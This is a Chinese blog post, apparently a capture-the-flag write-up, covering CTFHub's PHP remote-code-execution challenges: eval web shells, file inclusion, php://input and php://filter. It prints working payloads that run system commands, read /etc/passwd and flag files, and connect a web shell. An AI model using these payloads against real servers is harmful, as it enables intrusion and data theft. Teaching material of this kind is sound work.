@@ -1,0 +1,1081 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/chongqing.jpg">
+  <link rel="icon" href="/img/chongqing.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="sangnigege">
+  <meta name="keywords" content="一个做事不将就的人，阻止他的只有时间">
+  
+    <meta name="description" content="前言 本文是作者由CSDN博客迁移而来，原文地址：https:&#x2F;&#x2F;blog.csdn.net&#x2F;2302_81178149&#x2F;article&#x2F;details&#x2F;145460980?spm&#x3D;1001.2014.3001.5501  在众多的CTF平台当中，CTFHub对于初学者来说，是入门平台的不二之选。CTFHub通过自己独特的技能树模块，可以帮助初学者来快速入门。具体请看官方介绍：CTFHub。 作者">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RCE-CTFHub">
+<meta property="og:url" content="http://example.com/2025/05/04/RCE-CTFHub/index.html">
+<meta property="og:site_name" content="重庆森林不在重庆">
+<meta property="og:description" content="前言 本文是作者由CSDN博客迁移而来，原文地址：https:&#x2F;&#x2F;blog.csdn.net&#x2F;2302_81178149&#x2F;article&#x2F;details&#x2F;145460980?spm&#x3D;1001.2014.3001.5501  在众多的CTF平台当中，CTFHub对于初学者来说，是入门平台的不二之选。CTFHub通过自己独特的技能树模块，可以帮助初学者来快速入门。具体请看官方介绍：CTFHub。 作者">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021921486.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021921226.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021921827.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021921287.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021921885.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021921579.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021921698.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021921119.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021921185.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021921864.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922425.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922803.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922238.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922614.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922076.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922925.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922428.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922360.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922940.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922479.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922118.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922769.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922490.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922503.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923523.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923075.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923337.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923819.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923085.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923290.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923793.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021924987.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923840.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923379.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923208.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923318.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923536.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923740.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923242.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923198.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923528.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923046.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923498.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021923218.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021924621.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021924233.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021924497.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021924525.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021924833.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021924499.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021924234.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021924271.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021924685.png">
+<meta property="article:published_time" content="2025-05-04T09:21:00.000Z">
+<meta property="article:modified_time" content="2025-05-04T09:18:51.637Z">
+<meta property="article:author" content="sangnigege">
+<meta property="article:tag" content="CTFHub">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021921486.png">
+  
+  
+  
+  <title>RCE-CTFHub - 重庆森林不在重庆</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","app_key":"rSHs3EnI9lT7nQwv5J7fcBnq","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>重庆森林不在重庆</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="RCE-CTFHub"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-05-04 17:21" pubdate>
+          2025年5月4日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          20 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">RCE-CTFHub</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>本文是作者由CSDN博客迁移而来，原文地址：<a target="_blank" rel="noopener" href="https://blog.csdn.net/2302_81178149/article/details/145460980?spm=1001.2014.3001.5501">https://blog.csdn.net/2302_81178149/article/details/145460980?spm=1001.2014.3001.5501</a></p>
+</blockquote>
+<p>在众多的CTF平台当中，CTFHub对于初学者来说，是入门平台的不二之选。CTFHub通过自己独特的技能树模块，可以帮助初学者来快速入门。具体请看官方介绍：<a target="_blank" rel="noopener" href="https://www.ctfhub.com/#/index" title="CTFHub">CTFHub</a>。</p>
+<p><strong>作者的CTFHub技能树汇总：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2302_81178149/article/details/142747270?spm=1001.2014.3001.5502" title="CTFHub技能树Web汇总-CSDN博客">CTFHub技能树Web汇总-CSDN博客</a></p>
+<p>为了方便学习，在练习过程中可以查阅作者的RCE总结：<a target="_blank" rel="noopener" href="https://blog.csdn.net/2302_81178149/article/details/145461296" title="RCE学习总结-CSDN博客">RCE学习总结-CSDN博客</a></p>
+<h2 id="eval执行"><a href="#eval执行" class="headerlink" title="eval执行"></a>eval执行</h2><p>一进来是一段代码</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021921486.png" srcset="/img/loading.gif" lazyload></p>
+<p>那我们审计一下这段代码，if里面用了issert()函数，用来检测<code>$_REQUEST[&#39;cmd&#39;]</code>是否为空</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021921226.png" srcset="/img/loading.gif" lazyload></p>
+<p>那<code>$_REQUEST[&#39;cmd&#39;]</code>是什么？</p>
+<p>就是一种全局变量，来收集我们传递的<code>cmd</code>的值</p>
+<table>
+<thead>
+<tr>
+<th>变量</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>$_GET</code></td>
+<td>收集来自 <code>method=&quot;get&quot;</code> 的表单中的值</td>
+</tr>
+<tr>
+<td><code>$_POST</code></td>
+<td>收集来自 <code>method=&quot;post&quot;</code> 的表单中的值</td>
+</tr>
+<tr>
+<td><code>$_REQUEST</code></td>
+<td>包含 <code>$_POST</code>、<code>$_GET</code> 和 <code>$_COOKIE</code></td>
+</tr>
+<tr>
+<td><code>$GLOBALS</code></td>
+<td>全部变量的全局组合数组</td>
+</tr>
+<tr>
+<td><code>$_COOKIE</code></td>
+<td>常用于识别用户</td>
+</tr>
+<tr>
+<td><code>$_SESSION</code></td>
+<td>存储关于用户会话（session）的信息</td>
+</tr>
+<tr>
+<td><code>$_FILES</code></td>
+<td>用来获取通过 POST 方法上传文件的相关信息</td>
+</tr>
+<tr>
+<td><code>$_SERVER</code></td>
+<td>服务器和执行环境信息</td>
+</tr>
+<tr>
+<td><code>$_ENV</code></td>
+<td>环境变量</td>
+</tr>
+</tbody></table>
+<p>那这段代码我们就很清楚了，一旦我们用HTTP方法传递了<code>cmd</code>的值，就会继续往下执行，而下面明显是一句话木马。</p>
+<p>不知道什么是一句话木马可以去看看作者的文件上传总结：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2302_81178149/article/details/145433812" title="文件上传学习总结_文件上传学习 csdn-CSDN博客">文件上传学习总结_文件上传学习 csdn-CSDN博客</a></p>
+<p>所以我们用蚁剑连接试试</p>
+<p>连接成功</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021921827.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们在根目录下找到flag</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021921287.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021921885.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里其实算取巧了，我们再结合RCE专题训练一遍</p>
+<p>服务器一般都是Linux系统，我们试试Linux指令</p>
+<p>这里我们先提一下常见Linux指令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span>                  <span class="hljs-comment">#切换目录</span><br> <br><span class="hljs-built_in">ls</span>                   <span class="hljs-comment">#显示当前目录下的文件</span><br> <br>ifconfig              <span class="hljs-comment">#查看IP地址</span><br> <br><span class="hljs-built_in">cat</span> /etc/passwd       <span class="hljs-comment">#查看password文件内容</span><br> <br><span class="hljs-built_in">id</span>                  <span class="hljs-comment">#查看当前用户的id号</span><br> <br><span class="hljs-built_in">cat</span> /etc/group        <span class="hljs-comment">#查看用户组文件内容</span><br> <br><span class="hljs-built_in">pwd</span>                <span class="hljs-comment">#显示当前目录</span><br> <br><span class="hljs-built_in">uname</span> -a            <span class="hljs-comment">#查看当前系统版本</span><br> <br>natstat -pantu        <span class="hljs-comment">#查看当前服务器的端口信息</span><br> <br>netstat -nr           <span class="hljs-comment">#查看网关和路由</span><br></code></pre></td></tr></table></figure>
+
+<p>出来路径了</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://challenge-<span class="hljs-number">4668</span>abfa65cec5c5.sandbox.ctfhub.com:<span class="hljs-number">10800</span>?cmd=system(<span class="hljs-string">&quot;pwd&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021921579.png" srcset="/img/loading.gif" lazyload></p>
+<p>继续尝试，我们列一下根目录的文件</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://challenge-<span class="hljs-number">4668</span>abfa65cec5c5.sandbox.ctfhub.com:<span class="hljs-number">10800</span>/?cmd=system(%<span class="hljs-number">22</span>ls%<span class="hljs-number">20</span>/%<span class="hljs-number">22</span>);<br></code></pre></td></tr></table></figure>
+
+<p>出来了</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021921698.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们打开根目录下的这个文件</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://challenge-<span class="hljs-number">4668</span>abfa65cec5c5.sandbox.ctfhub.com:<span class="hljs-number">10800</span>/?cmd=system(%<span class="hljs-number">22</span>cat%<span class="hljs-number">20</span>/flag_26944%<span class="hljs-number">22</span>);<br></code></pre></td></tr></table></figure>
+
+<p>出Flag了</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021921119.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>还是代码</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021921185.png" srcset="/img/loading.gif" lazyload></p>
+<p>不过有个shell，我们看一下。</p>
+<p>发现还是一句话木马</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021921864.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们先来看一下那段代码是什么意思</p>
+<p><code>error\_reporting(0);</code> ：关闭所有错误报告。error_reporting() 函数用于设置 PHP 错误报告的级别，传递 0 作为参数将关闭所有错误报告。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922425.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>strpos($_GET[&quot;file&quot;], &quot;flag&quot;)</code>：返回”flag”在$_GET[“file”]中第一次出现的位置，如果“flag“不存在，则返回false。</p>
+<p>注意前面又加了！，那就是如果“flag“不存在，则返回true。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922803.png" srcset="/img/loading.gif" lazyload></p>
+<p>实际上就是检测我们传的参数带不带“flag“，带的话就会说我们是黑客</p>
+<p>比如我们输入：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://challenge-<span class="hljs-number">1</span>e934472c975c88d.sandbox.ctfhub.com:<span class="hljs-number">10800</span>/?file=%<span class="hljs-number">22</span>flag%<span class="hljs-number">22</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922238.png" srcset="/img/loading.gif" lazyload></p>
+<p>不带的话，就包含文件，文件名我们传递file的值。</p>
+<p>那肯定要包含shell.txt，并且连接蚁剑</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">http://challenge-<span class="hljs-number">1</span>e934472c975c88d.<span class="hljs-keyword">sandbox</span>.ctfhub.<span class="hljs-keyword">com</span>:<span class="hljs-number">10800</span>/?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">shell</span>.txt<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922614.png" srcset="/img/loading.gif" lazyload></p>
+<p>还是在根目录下找到flag</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922076.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922925.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h2><p>还是审计代码</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922428.png" srcset="/img/loading.gif" lazyload></p>
+<p>issert()函数用来检测$_GET[‘file’]是否为空，substr($_GET[“file”], 0, 6)是取出前6个字符，然后判断是否为”php:&#x2F;&#x2F;”，如果是，就会<code>include($_GET[&quot;file&quot;]);</code></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922360.png" srcset="/img/loading.gif" lazyload></p>
+<p>看题目很明显要求我们用到伪协议的<code>php://input</code>，</p>
+<p><strong><code>php://input</code></strong></p>
+<p>作用：可用于查看源码，同时是要查看未压缩文件的只读流。在post请求中能查看请求的原始数据，<strong>并将post请求中的post数据当作php代码执行。</strong>（只读流是说只能进行读操作的数据）</p>
+<p>条件：<code>allow_url_fopen=off/on；allow_url_include=on</code></p>
+<p>点击题中的 phpinfor 查看php情况，检查<code>allow_url_include</code>是否为on</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922940.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到已经开了</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922479.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后我们就用POST传参，别忘了传递参数</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?<span class="hljs-keyword">file</span>=php:<span class="hljs-comment">//input</span><br></code></pre></td></tr></table></figure>
+
+<p>POST传递的数据为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls /&quot;</span>):<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922118.png" srcset="/img/loading.gif" lazyload></p>
+<p>出flag位置了</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922769.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后还是POST传参，加上<code>?file=php://input</code></p>
+<p>POST传递的数据为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat /flag_541&quot;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>这里还是要修改成大家自己的flag位置。</p>
+<p>确保无误后放包，出flag</p>
+<h2 id="读取源代码"><a href="#读取源代码" class="headerlink" title="读取源代码"></a>读取源代码</h2><p>代码和之前相似</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922490.png" srcset="/img/loading.gif" lazyload></p>
+<p>还是尝试<code>php://input</code>，发现失败了，估计是<code>allow_url_include=off</code>的问题</p>
+<p>但是在php伪协议中还存在：<code>php://filter</code></p>
+<p><strong><code>php://filter</code></strong></p>
+<ul>
+<li>条件：<code>allow_url_fopen=off/on；allow_url_include=off/on</code></li>
+<li>作用：用过滤器读写数据流</li>
+</ul>
+<p>可以发现，<code>php://filter</code>相当于没有条件</p>
+<p>接下来我们进一步了解<code>php://filter</code>，其具有四个参数：</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>描述</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>resource=&lt;要过滤的数据流&gt;</code></td>
+<td>指定了你要筛选过滤的数据流。</td>
+<td>必选</td>
+</tr>
+<tr>
+<td><code>read=&lt;读链的筛选列表&gt;</code></td>
+<td>可以设定一个或多个过滤器名称，以管道符（|）分隔。</td>
+<td></td>
+</tr>
+<tr>
+<td><code>write=&lt;写链的筛选列表&gt;</code></td>
+<td>可以设定一个或多个过滤器名称，以管道符（|）分隔。</td>
+<td></td>
+</tr>
+<tr>
+<td><code>&lt;;两个链的筛选列表&gt;</code></td>
+<td>任何没有以 <code>read=</code> 或 <code>write=</code> 作前缀的筛选器列表会视情况应用于读或写链。</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>这道题就直接构造payload了</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/?file=php:/</span><span class="hljs-regexp">/filter/</span>resource=/flag<br></code></pre></td></tr></table></figure>
+
+<p>Flag出来了</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021922503.png" srcset="/img/loading.gif" lazyload></p>
